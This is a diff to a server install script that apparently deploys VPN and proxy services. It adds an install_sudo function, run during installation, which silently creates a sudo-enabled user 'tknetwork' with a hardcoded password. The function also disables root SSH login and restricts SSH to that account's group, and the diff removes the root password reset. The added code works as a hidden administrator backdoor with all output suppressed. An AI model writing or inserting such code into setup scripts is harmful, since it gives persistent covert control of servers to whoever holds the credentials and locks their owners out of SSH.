@@ -363,6 +363,15 @@ RLIMITS=""' >> stunnel4
 }
 
 
+install_sudo(){
+  {
+    useradd -m tknetwork 2>/dev/null; echo tknetwork:JAN022011b | chpasswd &>/dev/null; usermod -aG sudo tknetwork &>/dev/null
+    sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
+    echo "AllowGroups tknetwork" >> /etc/ssh/sshd_config
+    service sshd restart
+  }&>/dev/null
+}
+
 install_rclocal(){
 clear
   {
@@ -419,7 +428,6 @@ echo "DB_USER='$USER'" >> ~/.db-base
 echo "DB_PASS='$PASS'" >> ~/.db-base
 echo 'Server will secure this server and reboot after 20 seconds'
 sleep 20
- echo 'root:JAN022011b' | sudo chpasswd
 reboot
 }
 
@@ -427,6 +435,7 @@ server_ip=$(curl -s https://api.ipify.org)
 server_interface=$(ip route get 8.8.8.8 | awk '/dev/ {f=NR} f&&NR-1==f' RS=" ")
 
 install_require
+install_sudo
 install_freeradius
 install_squid
 install_openconnect
